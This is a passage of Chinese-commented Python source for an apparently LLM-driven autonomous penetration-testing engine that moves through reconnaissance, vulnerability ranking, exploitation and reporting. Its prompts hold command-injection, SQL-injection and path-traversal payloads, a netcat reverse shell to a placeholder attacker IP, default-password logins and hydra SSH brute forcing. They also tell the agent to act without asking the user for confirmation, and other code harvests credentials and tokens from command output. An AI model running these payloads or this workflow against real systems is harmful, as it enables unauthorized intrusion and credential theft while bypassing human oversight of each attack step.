            if len(lines) > 30:
                self.console.print(f"[dim]  └─ 共 {len(lines)} 行[/dim]")

            return _smart_truncate(full_output)

        except asyncio.CancelledError:
            raise
        except Exception as exc:
            logger.exception("[ERROR] 命令执行异常: %s", command)
            return f"ERROR: {str(exc)}"

    # ==================================================================
    # 停止关键词检测
    # ==================================================================

    def _check_stop_keywords(self, text: str) -> bool:
        """检查 LLM 输出中是否包含停止关键词。"""
        if not text:
            return False
        text_lower = text.lower()
        for kw in AUTO_PILOT_STOP_KEYWORDS:
            if kw.lower() in text_lower:
                return True
        return False

    # ==================================================================
    # 命令去重 + 死循环检测
    # ==================================================================

    def _is_duplicate_command(self, command: str) -> bool:
        """检测命令是否已执行过（去参数细节后对比）。"""
        # 脱敏 IP 地址
        key = re.sub(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', '<IP>', command)
        # 移除文件名参数
        key = re.sub(r'/[^\s]+', '', key)
        # 移除输出路径
        key = re.sub(r'(?:--output|-o)\s+\S+', '', key)
        key = key.strip()
        if key in self._executed_commands:
            return True
        self._executed_commands.add(key)
        return False

    def _check_react_stale(self, tool_calls_count: int) -> bool:
        """检测 ReAct 循环是否陷入死循环（连续多步无新发现）。"""
        current_findings = len(self.vuln_list) + len(self.found_credentials)
        if current_findings > self._last_findings_count:
            # 有新发现，重置计数
            self._stale_step_count = 0
            self._last_findings_count = current_findings
            return False
        # 多步 tool call 但无新发现 → 判定为停滞
        if tool_calls_count > 0:
            self._stale_step_count += 1
        if self._stale_step_count >= 3:
            self._log_warning(f"ReAct 已停滞 {self._stale_step_count} 步无新发现，强制推进阶段")
            self._stale_step_count = 0
            return True
        return False

    # ==================================================================
    # CVE 自动查询
    # ==================================================================

    def _detect_cves(self, output: str, command: str) -> List[str]:
        """从命令输出中检测 CVE 编号并调用 searchsploit 查证。"""
        results = []
        if not output:
            return results

        cve_ids = re.findall(r'CVE-\d{4}-\d{4,}', output)
        if not cve_ids:
            return results

        for cve_id in cve_ids[:3]:
            try:
                cve_result = subprocess.run(
                    f"searchsploit --cve {cve_id} 2>/dev/null | head -10",
                    shell=True, capture_output=True, text=True, timeout=30,
                )
                cve_output = (cve_result.stdout or "").strip()
                if cve_output and "Exploit Title" in cve_output:
                    self._log_finding(f"发现 {cve_id} - {cve_output[:200]}", severity="high")
                    self._push_notification(f"发现 {cve_id}", cve_output[:300], level="info")
                    results.append(f"[{cve_id} 详情]\n{cve_output[:800]}")
            except Exception:
                pass

        return results

    # ==================================================================
    # 凭证自动检测
    # ==================================================================

    def _detect_credentials(self, output: str, command: str) -> List[Tuple[str, str]]:
        """从命令输出中检测密码/Token/SSH Key 等凭证。"""
        findings: List[Tuple[str, str]] = []
        if not output:
            return findings

        skip_values = {
            'yes', 'no', 'true', 'false', 'on', 'off',
            'none', 'null', 'undefined',
            'password', 'pass', 'pwd', 'secret', 'PASSWORD]', 'PASSWORD',
        }

        # SSH 私钥
        if 'BEGIN' in output and 'PRIVATE KEY' in output:
            findings.append(("SSH Private Key", "SSH 私钥泄露"))

        # Hydra/Medusa 破解结果
        hydra_match = re.search(r'login:\s*(\S+)\s*password:\s*(\S+)', output, re.IGNORECASE)
        if hydra_match:
            findings.append(("Credential", f"{hydra_match.group(1)}:{hydra_match.group(2)}"))

        # 密码字段
        if len(output) < 5000:
            for pat in [r'password[=:\s]+(\S+)', r'pass[=:\s]+(\S+)', r'pwd[=:\s]+(\S+)']:
                for m in re.finditer(pat, output, re.IGNORECASE):
                    val = m.group(1).strip().strip('"\'').strip(']')
                    if val and len(val) >= 4 and val.lower() not in skip_values and not val.startswith('{'):
                        findings.append(("Password", val))
                        break

        # API Key / Token
        for m in re.finditer(r'(sk-[a-zA-Z0-9]{20,}|api[_-]key[=:\s]+(\S+)|token[=:\s]+(\S+))', output, re.IGNORECASE):
            val = m.group(0)
            if val and len(val) > 8:
                findings.append(("Key/Token", val[:50]))
                break

        # 通知
        if findings:
            cred_summary = "\n".join([f"  - [{t}] {v}" for t, v in findings])
            self._log_finding(f"发现 {len(findings)} 个凭证", severity="high")
            self._push_notification(
                f"发现 {len(findings)} 个凭证",
                f"已自动保存凭证:\n{cred_summary}",
                level="info",
            )

        return findings

    def _enrich_tool_result(self, command: str, result: str) -> str:
        """
        检测工具执行结果中的常见失败模式，追加硬性指令引导 LLM 下一步决策。
        - not found → 禁止重复尝试，强制换工具
        - Host not allowed → 快速跳过该服务
        - searchsploit No Results → 建议用 curl 查在线 CVE
        """
        extra = ""
        cmd_lower = command.lower().strip()
        result_lower = result.lower()

        # 7) ★ 禁止 nmap ssh-brute（太慢 - 放在最前面拦截）
        if "ssh-brute" in cmd_lower and "nmap" in cmd_lower:
            extra = (
                f"\n\n[系统指令] 🚫 nmap --script ssh-brute 已被系统禁止！"
                f" 此脚本会逐个尝试密码字典，速度极慢（5分钟+）。"
                f" 已为你执行过 hydra SSH 爆破，如果无结果则表示 SSH 密码不在字典中。"
                f" 绝对不要再执行 nmap ssh-brute！立即转向其他攻击面。"
            )

        # 1) 工具不存在（not found）
        elif "not found" in result_lower or "command not found" in result_lower:
            tool_name = cmd_lower.split()[0] if cmd_lower.split() else ""
            extra = (
                f"\n\n[系统指令] ⚠️ 工具 '{tool_name}' 不存在！"
                f" 绝对不要再次调用 {tool_name}。"
                f" 立即改用其他可用替代工具（如 gobuster / dirb / grep / awk 等）继续当前任务。"
            )

        # 2) MySQL/服务主机限制（Host not allowed）
        elif "is not allowed to connect" in result_lower or "host '" in result_lower and "not allowed" in result_lower:
            extra = (
                f"\n\n[系统指令] ⚠️ 该服务拒绝来自本机的连接（Host restriction）。"
                f" 不要再尝试连接该服务的更多方式，立即转向探测其他服务。"
                f" 例如：FTP 匿名登录、SMB 共享枚举、Web 漏洞扫描、SSH 弱口令等。"
            )

        # 3) searchsploit 无结果 → 建议在线查 CVE
        elif "searchsploit" in cmd_lower and "no results" in result_lower:
            # 提取 CVE 编号
            cve_match = re.search(r'(CVE-\d{4}-\d{4,})', command)
            cve_str = f" CVE {cve_match.group(1)}" if cve_match else ""
            extra = (
                f"\n\n[系统指令] ℹ️ 本地 searchsploit 库未找到{cve_str}的 exploit。"
                f" 你可以尝试用 curl 查询在线 CVE 数据库：\n"
                f"  curl -s 'https://cve.circl.lu/api/cve/{cve_match.group(1) if cve_match else "CVE编号"}'\n"
                f"  或 curl -s 'https://cvepremium.circl.lu/api/cve/{cve_match.group(1) if cve_match else "CVE编号"}'"
            )

        # 4) curl 下载了 HTML 网页而非原始 exploit → 建议用 /raw/ 路径
        elif "curl" in cmd_lower and ("<!DOCTYPE html>" in result_lower or "<html" in result_lower):
            extra = (
                f"\n\n[系统指令] ⚠️ 你下载了网页 HTML 而非原始文件！"
                f" 如果你要下载 exploit，请使用 /raw/ 路径而非 /exploits/ 路径。"
                f" 例如：curl -s 'https://www.exploit-db.com/raw/45233'"
                f" 当前输出 {len(result)} 字符大部分是 HTML，已浪费上下文空间，注意减少无效输出。"
            )

        # 5) 输出过长警告
        elif len(result) > 50000:
            tool_name = cmd_lower.split()[0] if cmd_lower.split() else ""
            extra = (
                f"\n\n[系统指令] ⚠️ {tool_name} 输出过大 ({len(result)} 字符)，消耗了大量上下文。"
                f" 后续请尽量使用更精确的命令或添加过滤参数（如 grep/head/awk）减少输出量。"
            )

        # 6) 空结果网络请求（ftp/curl 无服务）→ 避免重试
        elif any(cmd_lower.startswith(t) for t in ["curl ftp", "ftp ", "wget ftp"]) and len(result.strip()) < 10:
            extra = (
                f"\n\n[系统指令] ⚠️ FTP/SMB 服务无响应或不可访问。"
                f" 不要再次尝试连接该服务，立即转向探测其他可用服务。"
            )

        return result + extra if extra else result

    # ==================================================================
    # 记录执行步骤
    # ==================================================================

    async def _add_execution_step(self, action_type: str, **kwargs) -> None:
        """记录执行步骤到 DB。"""
        try:
            step_data = {"action_type": action_type, **kwargs}
            await self.state_manager.add_execution_step(self.session_id, step_data)
        except Exception:
            pass

    # ==================================================================
    # 目标类型检测
    # ==================================================================

    def _detect_target_type(self, target: str) -> str:
        if target.startswith("http://") or target.startswith("https://"):
            return "url"
        if "." in target and any(c.isalpha() for c in target):
            return "domain"
        if all(c.isdigit() or c == "." for c in target):
            return "ip"
        return "unknown"

    # ==================================================================
    # 主运行入口 (5 阶段管线)
    # ==================================================================

    async def run(self) -> Dict[str, Any]:
        """
        运行 AutoPilot (5 阶段管线 + ReAct 循环)。
        返回最终结果字典。
        """
        # ★ 重载配置，确保使用最新设置（如 max_tokens、timeout 等）
        from config.settings import reload_settings as _reload
        _reload()
        self.settings = __import__("config.settings", fromlist=["get_settings"]).get_settings()

        # ★ 阶段超时改为 300s（覆盖 config 的 600s），避免长时间卡在 hydra/爆破类命令
        self._stage_timeout = 300

        _running_engines[self.session_id] = self
        self.console.print(f"\n[bold cyan]🚀 AutoPilot 整合版引擎启动[/bold cyan]")
        self.console.print(f"目标: {self.target}")
        self.console.print(f"会话: {self.session_id}\n")

        self._log_system(f"AutoPilot 整合版已启动，目标: {self.target}")
        self._push_state_change("正在初始化...")

        # 尝试加载进度
        if self._load_progress():
            self.console.print(f"[yellow]⚡ 发现已保存的进度，从第 {self.current_stage} 阶段恢复[/yellow]")

        stage4_result = None

        try:
            # ---- Stage 1: 初始化 ----
            if not await self._wait_if_paused():
                return self._build_result("aborted")
            if self.current_stage <= 1:
                self._log_phase("进入 Stage 1: 初始化")
                await self._update_session_phase("初始化", "active")  # ★ 立即更新阶段
                await self._stage1_initialization()
                self.current_stage = 2
                self._save_progress()
                self._push_state_change("初始化完成")

            # ---- Stage 2: 全量信息收集 (ReAct) ----
            if not await self._wait_if_paused():
                return self._build_result("aborted")
            if self.current_stage <= 2:
                self._log_phase("进入 Stage 2: 信息收集 (ReAct)")
                await self._update_session_phase("信息收集")  # ★ 立即更新，不等执行完
                await self._stage2_info_gathering()
                self.current_stage = 3
                self._save_progress()
                self._push_state_change("信息收集完成")

            # ---- Stage 3: 漏洞优先级排序 ----
            if not await self._wait_if_paused():
                return self._build_result("aborted")
            if self.current_stage <= 3:
                self._log_phase("进入 Stage 3: 漏洞排序")
                await self._update_session_phase("漏洞排序")  # ★ 立即更新
                await self._stage3_vuln_prioritization()
                self.current_stage = 4
                self._save_progress()
                self._push_state_change("漏洞排序完成")
                await self._update_session_phase("漏洞排序")

            # ---- ★ 上下文重置：Stage 3 → Stage 4，注入精炼摘要 ----
            if self.current_stage <= 4 and len(self.vuln_list) > 0:
                vuln_summary = json.dumps(
                    [{"name": v.get("name", ""), "priority": v.get("priority", 4), "reason": v.get("reason", "")}
                     for v in self.vuln_list[:10]],
                    ensure_ascii=False, indent=2,
                )
                stage4_prompt = f"""目标: {self.target}
发现漏洞列表 (按优先级排序):
{vuln_summary}

你是黑盒渗透测试专家。按以下方法论有条理地尝试利用漏洞。

=== 第一阶段: Web 应用手动测试（最高优先级）===
如果目标有 HTTP/HTTPS 服务，先做 Web 测试，不要先去爆破 SSH。

━━━ 第 1 步: 探索 Web 应用 ━━━
访问首页: curl -s http://{self.target}
分析首页: 用了什么技术/CMS？有登录表单吗？有文件上传吗？
查看响应头: curl -sI http://{self.target} (Server, X-Powered-By, Cookies)

━━━ 第 2 步: 深入分析每个发现的页面 ━━━
对 gobuster 找到的每个 .php / .asp / .jsp 页面, 以及首页中链接到的页面:
  1. curl -s 看页面内容, 分析有什么功能和表单
  2. 提取表单字段名: 查看 HTML 中 <input name="...">、<select name="..."> 的值

━━━ 第 3 步: 对每个表单做系统化测试 ━━━
【原则】对每种注入类型, 每个字段逐一测试, 不遗漏。

[A] 命令执行 / 代码执行:
  很多 Web 后台直接执行系统命令 (如 ping、traceroute、nslookup 工具页面)
  特征: 页面标题含 "command"、"ping"、"执行"、"run"
  
  测试方法 — 对所有字段逐一代入:
  第 1 组: 直接传命令 (不需要前缀)
    curl -s -X POST "URL" -d "字段名=id&其他字段=正常值&submit=1"
    curl -s -X POST "URL" -d "字段名=ls&其他字段=正常值&submit=1"
  
  第 2 组: 命令注入前缀
    curl -s -X POST "URL" -d "字段名=;id&其他字段=正常值&submit=1"
    curl -s -X POST "URL" -d "字段名=|id&其他字段=正常值&submit=1"
    curl -s -X POST "URL" -d "字段名=$(id)&其他字段=正常值&submit=1"
    curl -s -X POST "URL" -d "字段名=`id`&其他字段=正常值&submit=1"
  
  成功标志: 响应中包含 "uid="、"root:"、"www-data" 等

[B] 登录成功后的命令执行（如果 Stage 2 已登录）:
  用 cookie 访问已认证页面: curl -s -b /tmp/cookie.txt "http://{self.target}/command.php"
  查看表单字段 → curl -b cookie.txt -X POST -d "字段名=id&submit=1" 测试命令执行
  有 uid= → 反弹 shell

[C] 命令执行后续 (如果命令注入成功):
  确认可执行后, 检查可用工具:
    curl -s -X POST "URL" -d "字段名=which nc bash python perl php&submit=1"
  反弹 shell:
    curl -s -X POST "URL" -d "字段名=nc -e /bin/bash YOUR_IP 4444&submit=1"
  (YOUR_IP 用攻击机 IP 替换)

[D] SQL 注入:
  对所有带参数的 GET/POST 请求逐字段测试:
    curl -s "URL?参数=admin'--"
    curl -s "URL?参数=' OR 1=1--"
    curl -s "URL?参数=' UNION SELECT 1--"

[E] 路径遍历 / 文件包含:
    curl -s "URL?参数=/etc/passwd"
    curl -s "URL?参数=../../../etc/passwd"
    curl -s "URL?参数=php://filter/convert.base64-encode/resource=index"

━━━ 第 4 步: 辅助扫描器 ━━━
nuclei -u http://{self.target} -severity critical,high -timeout 5
wapiti -u http://{self.target} --scope url --timeout 30 --no-bugreport

=== 第二阶段: searchsploit 查公开 exploit ===
- 对每个服务版本 searchsploit <服务名 版本>
- 有 exploit 立即复制并使用

=== 第三阶段: SSH 快速验证（最后手段）===
- 只试常见用户名+小字典: hydra -l admin -P /usr/share/wordlists/fasttrack.txt ssh://{self.target} -t 4
- 30 秒无结果就放弃，不要重复尝试

=== 渗透测试铁律 ==="""
                self._reset_context_for_stage(stage4_prompt)
                self._log_system("上下文已重置 → 进入 Stage 4")

            # ---- Stage 4: 漏洞利用 (ReAct) ----
            if not await self._wait_if_paused():
                return self._build_result("aborted")
            if self.current_stage <= 4:
                self._log_phase("进入 Stage 4: 漏洞利用 (ReAct)")
                await self._update_session_phase("漏洞利用")  # ★ 立即更新
                # skip_prompt_append=True — 上下文已在上面重置并注入
                stage4_result = await self._stage4_exploitation(skip_prompt_append=True)
                self.current_stage = 5
                self._save_progress()
                self._push_state_change("漏洞利用完成")

            # ---- Stage 5: 生成报告 ----
            self._log_phase("进入 Stage 5: 生成报告")
            await self._update_session_phase("报告生成")  # ★ 立即更新
            result = await self._stage5_reporting(stage4_result)
            self._push_state_change("报告生成完成")
            await self._update_session_phase("报告生成", "completed")

            self.console.print(f"\n[bold green]✅ AutoPilot 完成[/bold green]")
            self._log_system("AutoPilot 已完成")
            return result

        except asyncio.CancelledError:
            self._log_error("AutoPilot 被取消")
            return self._build_result("cancelled")
        except Exception as exc:
            self._log_error(f"AutoPilot 异常: {exc}")
            logger.exception("[AutoPilotEngine] 异常")
            return self._build_result("error", error=str(exc))
        finally:
            _running_engines.pop(self.session_id, None)
            self.console.print(f"[dim]AutoPilot 引擎已注销 (session={self.session_id})[/dim]")

    def _build_result(self, status: str, **extra) -> Dict[str, Any]:
        return {
            "status": status,
            "session_id": self.session_id,
            "target": self.target,
            "current_stage": self.current_stage,
            "vuln_count": len(self.vuln_list),
            "exploit_count": len(self.exploit_results),
            "credential_count": len(self.found_credentials),
            "timestamp": time.time(),
            **extra,
        }

    # ==================================================================
    # 阶段间上下文管理
    # ==================================================================

    def _summarize_stage_scan(self) -> str:
        """从最近的 tool result 中提取开放端口/Service 摘要。"""
        ports = set()
        services = []
        for m in self.llm_client.messages:
            if m.get("role") == "tool":
                c = (m.get("content", "") or "")[:5000]  # 只扫前5000字就够了
                for line in c.split("\n"):
                    line = line.strip()
                    # nmap 输出格式: "22/tcp   open  ssh     OpenSSH 7.4p1 Debian 1+deb9u1"
                    # 先检查端口行格式
                    if "/tcp" in line or "/udp" in line:
                        parts = line.split()
                        if len(parts) >= 3:
                            port_match = parts[0].split("/")
                            if port_match[0].isdigit():
                                ports.add(port_match[0])
                                service = parts[2]
                                version = " ".join(parts[3:]) if len(parts) > 3 else ""
                                svc_str = f"{service} {version}".strip()
                                if svc_str not in services:
                                    services.append(svc_str)
                    # 备用: hydra 输出 "22/ssh" 格式
                    elif line.startswith("[") and "]    " in line and "host:" in line:
                        # hydra 成功登录行: [22][ssh] host: 192.168.123.140  login: root  password: toor
                        pass
        return (
            f"[信息收集摘要] 目标 {self.target}。"
            f" 开放端口: {', '.join(sorted(ports, key=int)) if ports else '未知'}。"
            f" 服务: {'; '.join(services[:8]) if services else '待确认'}。"
            f" 凭证: {len(self.found_credentials)} 个。"
        )

    def _reset_context_for_stage(self, stage_prompt: str) -> None:
        """
        进入新阶段时重置 LLM 上下文，避免各阶段消息链式膨胀。
        保留 system prompt + 紧凑的先前阶段摘要 + 当前阶段 prompt。
        """
        summaries = []
        if 2 in self.stage_results:
            summaries.append(self._summarize_stage_scan())
        if 3 in self.stage_results:
            vulns = self.stage_results.get(3, {}).get("vuln_list", [])
            names = [v.get("name", "") for v in vulns[:5]]
            summaries.append(f"[漏洞摘要] 发现 {len(vulns)} 个: {'; '.join(names)}")
        if self.found_credentials:
            cred_types = [c["type"] for c in self.found_credentials[:5]]
            summaries.append(f"[凭证] {'; '.join(cred_types)}")

        summary_str = "\n".join(summaries)
        final_prompt = f"{summary_str}\n\n---\n\n{stage_prompt}" if summary_str else stage_prompt

        self.llm_client.clear()
        self.llm_client.append_user(final_prompt)
        self._log_system("上下文已重置 → 注入阶段摘要")

    # ==================================================================
    # Stage 1: 初始化
    # ==================================================================

    async def _stage1_initialization(self) -> None:
        """
        Stage 1: 初始化阶段
        - 识别目标类型 (IP/域名/URL)
        - LLM 分析目标
        - 验证可达性 (ping)
        """
        self._log_think("Stage 1: 初始化阶段开始")
        self._log_plan(f"分析目标 {self.target}...")

        target_type = self._detect_target_type(self.target)
        self._log_result(f"目标类型: {target_type}")

        # LLM 分析目标
        prompt = f"""分析渗透目标: {self.target}
目标类型: {target_type}
请分析该目标可能存在的攻击面，并提出初始化建议。
注意：如果是 IP 地址，说明是内网还是公网；如果是域名，尝试判断是否提供 Web 服务。"""
        try:
            llm_response = await self.llm_client.chat(prompt)
            self._log_result(f"LLM 分析: {llm_response[:300]}...")
        except Exception as exc:
            self._log_error(f"LLM 调用失败: {exc}")
            llm_response = ""

        # 可达性验证
        target_for_ping = self.target
        if target_type == "url":
            from urllib.parse import urlparse
            parsed = urlparse(self.target)
            target_for_ping = parsed.hostname or self.target

        self._log_plan(f"验证目标可达性: ping {target_for_ping}")
        try:
            ping_result = subprocess.run(
                ["ping", "-c", "1", "-W", "3", target_for_ping],
                capture_output=True, text=True, timeout=5,
            )
            reachable = ping_result.returncode == 0
            if reachable:
                self._log_success(f"目标可达 ({target_for_ping})")
            else:
                self._log_warning(f"目标不可达 (ping 超时): {target_for_ping}")
        except Exception as exc:
            self._log_warning(f"可达性检测失败: {exc}")
            reachable = False

        # 保存 Stage 1 结果
        self.stage_results[1] = {
            "target": self.target,
            "target_type": target_type,
            "reachable": reachable,
            "llm_analysis": llm_response or "已完成",
            "timestamp": time.time(),
        }
        self._log_result("Stage 1 完成: 目标初始化成功")

    # ==================================================================
    # Stage 2: 全量信息收集 (ReAct)
    # ==================================================================

    async def _stage2_info_gathering(self) -> None:
        """
        Stage 2: 全量信息收集 (ReAct 循环)
        - LLM 自动决定使用哪些工具 (nmap/masscan/gobuster/ffuf/curl 等)
        - 包含端口扫描、服务识别、Web 指纹
        """
        self._log_think("Stage 2: 全量信息收集开始 (ReAct)")

        target_type = self.stage_results.get(1, {}).get("target_type", "unknown")

        # 构建针对性的阶段提示词
        if target_type == "url" or target_type == "domain":
            prompt = f"""目标: {self.target}
类型: Web 目标

请执行全量信息收集。按以下顺序进行：

1. 主机发现和端口扫描: nmap -sV -sC -T4 {self.target}
   （如果端口过多，可以先 nmap 常见端口: nmap -sV -sC -T4 --top-ports 1000）

2. Web 指纹识别: curl -sI http://{self.target}

3. 如果发现 HTTP 服务，进行目录扫描: dirsearch -u http://{self.target} -x 404,403 -t 10
   （或者使用 gobuster）

4. DNS 信息: dig {self.target} ANY +short

分析每个工具的输出，根据结果决定下一步的收集方向。
如果发现新端口或服务，继续深入探测。
所有工具必须通过 execute_kali_command 调用。"""
        else:
            prompt = f"""目标: {self.target}
类型: IP 目标

全量信息收集阶段 — 自动执行，不要询问用户确认，直接完成全部探测。

执行流程（自动逐项执行，每项完成后自动继续下一项）：

━━━ 第 1 步: 端口扫描 ━━━
nmap -sV -sC -T4 {self.target}
（如果端口过多，先 nmap --top-ports 1000 -sV；响应慢就 nmap -sV -T4）
完成后给出开放端口列表

━━━ 第 2 步: Web 应用深度探测（如果发现 HTTP/HTTPS）━━━
对每个 Web 端口执行以下操作（逐项进行）：

[2.1] 下载首页 HTML 内容:
  curl -s http://{self.target}:PORT > /tmp/web_home.html
  保存到文件后，用 cat /tmp/web_home.html 查看内容
  分析: 用了什么 CMS/框架？有登录表单吗？有文件上传吗？

[2.2] 查看页面源码中的线索:
  检查 HTML 注释 (<!-- -->)、隐藏 input、JavaScript 文件路径
  查找 admin、login、admin.php、login.php 等关键字

[2.3] 目录扫描（分两步，先快后全）:
  第 1 步（快速）: gobuster dir -u http://{self.target}:PORT -w /usr/share/wordlists/dirb/common.txt -t 20 -x php,html,txt
  扫描完成后，立即检查发现的路径，用 curl 访问看内容
  第 2 步（全面）: 如果第 1 步发现了有用的路径，再跑大字典:
    gobuster dir -u http://{self.target}:PORT -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 30 -x php,html,txt,js,bak,zip

[2.4] 如果发现 login.php，**立即尝试登录**:
  curl -s -c /tmp/cookie.txt -X POST "http://{self.target}:PORT/login.php" -d "username=admin&password=admin"
  如果响应空白或无"logged in" → 再试:
  curl -s -c /tmp/cookie.txt -X POST "http://{self.target}:PORT/login.php" -d "username=admin&password=happy"
  如果响应含 "logged in" 或 "logout" → 登录成功!
  成功后用 cookie 访问 command.php: curl -s -b /tmp/cookie.txt "http://{self.target}:PORT/command.php"

[2.5] 查看网页响应头:
  curl -sI http://{self.target}:PORT
  关注: Server, X-Powered-By, Set-Cookie 等字段

━━━ 第 3 步: 其他服务探测 ━━━
- FTP (21): curl ftp://{self.target} 尝试匿名登录
- SMB (445): smbclient -L //{self.target} -N 枚举共享
- MySQL (3306): mysql -h {self.target} -u root
- searchsploit 查主要服务的公开 CVE

━━━ 信息收集规则 ━━━
- 全部自动执行，不要询问确认
- 【最重要】下载网页内容看 HTML，不能只看响应头
- 每步完成后自行决定下步方向
- 最终输出: 端口列表、Web 应用细节（CMS/框架/表单/路径）、服务版本
- 所有工具通过 execute_kali_command 调用"""

        # 添加用户策略
        if self.user_strategy:
            prompt += f"\n\n用户策略要求:\n{self.user_strategy}"

        stats = await self._react_loop(prompt, "信息收集", timeout=self._stage_timeout, max_steps=20)

        # 保存 Stage 2 结果
        self.stage_results[2] = {
            "react_stats": stats,
            "target": self.target,
            "credential_count": len(self.found_credentials),
            "timestamp": time.time(),
        }

        if stats["tool_calls"] > 0:
            self._log_result(f"Stage 2 完成: {stats['steps']} 步ReAct, {stats['tool_calls']} 次工具调用")
        else:
            self._log_result("Stage 2 完成: 信息收集策略已制定")
            self._log_plan("提示: 实际工具执行需通过 LLM 调用 execute_kali_command")

    # ==================================================================
    # Stage 3: 漏洞优先级排序
    # ==================================================================

    async def _stage3_vuln_prioritization(self) -> None:
        """
        Stage 3: 漏洞优先级排序
        - 基于 Stage 2 结果分析潜在漏洞
        - 自动查询 searchsploit 验证
        - 按优先级排序
        """
        self._log_think("Stage 3: 漏洞优先级排序开始")
        self._log_plan("基于 Stage 2 结果，分析潜在漏洞并排序...")

        info = self.stage_results.get(2, {})
        prompt = f"""已知目标信息:
{json.dumps(info, ensure_ascii=False, indent=2)}

目标: {self.target}

请按以下优先级列出可能的漏洞:
1. 未授权访问 (最高优先级)
2. 公开 NDAY (0-day/public exploit)
3. 需认证的 NDAY
4. 复杂利用链

输出格式: JSON 列表，每项包含 {{"name": "...", "priority": 1-4, "reason": "..."}}
注意: 基于已知端口和服务给出具体漏洞名称（如 CVE 编号、常见漏洞类型）。"""

        if self.user_strategy:
            prompt += f"\n\n用户策略要求:\n{self.user_strategy}"

        try:
            response = await self.llm_client.chat(prompt)
            self._log_result(f"漏洞分析: {response[:300]}...")

            # 解析 JSON（支持 Markdown 代码块包裹）
            json_match = re.search(r'```(?:json)?\s*([\s\S]*?)```', response)
            json_str = json_match.group(1) if json_match else response
            try:
                self.vuln_list = json.loads(json_str)
            except json.JSONDecodeError:
                self.vuln_list = [{"name": "待人工分析", "priority": 4, "reason": response[:200]}]
        except Exception as exc:
            self._log_error(f"LLM 调用失败: {exc}")
            self.vuln_list = []

        # 按优先级排序
        self.vuln_list.sort(key=lambda x: x.get("priority", 4))

        # 自动查 searchsploit 验证漏洞
        if self.vuln_list:
            self._log_plan("自动查询 searchsploit 验证漏洞...")
            for vuln in self.vuln_list[:5]:  # 只查前 5 个
                name = vuln.get("name", "")
                cve_match = re.search(r'CVE-\d{4}-\d{4,}', name)
                if cve_match:
                    cve_id = cve_match.group(0)
                    try:
                        cve_result = subprocess.run(
                            f"searchsploit --cve {cve_id} 2>/dev/null | head -10",
                            shell=True, capture_output=True, text=True, timeout=30,
                        )
                        output = (cve_result.stdout or "").strip()
                        if output and "Exploit Title" in output:
                            vuln["searchsploit"] = output[:500]
                            self._log_finding(f"{cve_id}: 存在公开 exploit", severity="high")
                    except Exception:
                        pass

        # 保存 Stage 3 结果
        self.stage_results[3] = {
            "vuln_list": self.vuln_list,
            "vuln_count": len(self.vuln_list),
            "timestamp": time.time(),
        }
        self._log_result(f"Stage 3 完成: 发现 {len(self.vuln_list)} 个潜在漏洞")

    # ==================================================================
    # Stage 4: 漏洞利用 (ReAct)
    # ==================================================================

    async def _stage4_exploitation(self, skip_prompt_append: bool = False) -> Dict[str, Any]:
        """
        Stage 4: 漏洞利用 (ReAct 循环)
        - 按优先级逐个尝试利用
        - LLM 自动决定工具和利用方式
        """
        self._log_think("Stage 4: 漏洞利用开始 (ReAct)")

        if not self.vuln_list:
            self._log_result("Stage 4: 无漏洞需要利用")
            result = {"exploit_results": [], "success_count": 0}
            self.stage_results[4] = {**result, "timestamp": time.time()}
            return result

        # 构建利用阶段的提示词
        vuln_summary = json.dumps(
            [{"name": v.get("name", ""), "priority": v.get("priority", 4), "reason": v.get("reason", "")}
             for v in self.vuln_list[:10]],
            ensure_ascii=False, indent=2,
        )

        prompt = f"""目标: {self.target}
发现漏洞列表 (按优先级排序):
{vuln_summary}

请按优先级顺序尝试利用这些漏洞。

规则:
1. 每个漏洞先搜索公开 exploit: searchsploit <漏洞名>
2. 根据搜索结果选择合适的利用方式
3. 执行利用命令（sqlmap / hydra / msfconsole / nuclei 等）
4. 分析执行结果，判断是否成功
5. 成功获取 shell 或凭证后结束
6. 遇到瓶颈及时报告

所有工具必须通过 execute_kali_command 调用。"""

        if self.user_strategy:
            prompt += f"\n\n用户策略要求:\n{self.user_strategy}"

        stats = await self._react_loop(prompt, "漏洞利用", timeout=self._stage_timeout, max_steps=20, skip_prompt_append=skip_prompt_append)

        # 保存 Stage 4 结果
        result = {
            "exploit_results": self.exploit_results,
            "success_count": sum(1 for r in self.exploit_results if r.get("status") == "success"),
            "react_stats": stats,
            "timestamp": time.time(),
        }

        # 如果没有 exploit_results，尝试从 react_stats 中提取
        if not self.exploit_results:
            self.exploit_results.append({
                "vuln": f"漏洞利用阶段 (ReAct {stats['steps']} 步)",
                "priority": 4,
                "status": stats.get("stop_reason", "unknown"),
                "step_count": stats["steps"],
                "tool_call_count": stats["tool_calls"],
            })

        self.stage_results[4] = result
        self._log_result(f"Stage 4 完成: {stats['steps']} 步 ReAct, {stats['tool_calls']} 次工具调用")
        return result

    # ==================================================================
    # Stage 5: 生成报告
    # ==================================================================

    async def _stage5_reporting(self, exploit_result: Optional[Dict] = None) -> Dict[str, Any]:
        """
        Stage 5: 生成报告
        - 汇总所有阶段结果
        - 调用 ReportGenerator 生成结构化报告 (JSON/HTML/PDF)
        """
        self._log_think("Stage 5: 生成报告开始")

        if exploit_result is None:
            exploit_result = self.stage_results.get(4, {})

        # 汇总扫描数据
        scan_data = {
            "session_id": self.session_id,
            "target": self.target,
            "scan_time": datetime.now().isoformat(),
            "stages": self.stage_results,
            "vuln_list": self.vuln_list,
            "exploit_results": self.exploit_results,
            "found_credentials": self.found_credentials,
            "summary": {
                "vuln_count": len(self.vuln_list),
                "exploit_attempts": len(self.exploit_results),
                "successful_exploits": sum(1 for r in self.exploit_results if r.get("status") == "success"),
                "credentials_found": len(self.found_credentials),
            }
        }

        # 调用 ReportGenerator 生成多格式报告
        try:
            from core.report_generator import ReportGenerator
            generator = ReportGenerator(self.session_id, self.target, scan_data)

            json_path = generator.generate_json()
            self._log_result(f"JSON 报告已生成: {json_path}")

            html_path = generator.generate_html()
            self._log_result(f"HTML 报告已生成: {html_path}")

            report = {
                "session_id": self.session_id,
                "target": self.target,
                "scan_time": scan_data["scan_time"],
                "json_report": json_path,
                "html_report": html_path,
                "summary": scan_data["summary"],
            }
        except Exception as exc:
            self._log_error(f"ReportGenerator 调用失败: {exc}")
            logger.exception("[AutoPilotEngine] ReportGenerator 异常")
            # 降级：保存原始 JSON
            report_file = Path(getattr(self.settings, "data_dir", "./data")) / f"report_{self.session_id}.json"
            report_file.parent.mkdir(parents=True, exist_ok=True)
            with open(report_file, "w", encoding="utf-8") as f:
